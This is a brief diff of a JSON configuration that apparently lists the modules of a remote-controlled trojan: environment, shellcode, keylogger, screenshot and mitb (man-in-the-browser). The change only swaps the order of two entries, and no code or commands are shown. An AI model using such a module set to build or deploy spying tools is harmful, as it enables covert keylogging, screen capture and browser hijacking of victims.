@@ -1,6 +1,6 @@
 [
    {
-     "module" : "environment"
+     "module" : "shellcode"
    },
    {
      "module" : "keylogger"
@@ -9,7 +9,7 @@
       "module" : "screenshot"
    },
    {
-      "module"  : "shellcode"
+      "module"  : "environment"
    },
     {
       "module" : "mitb"
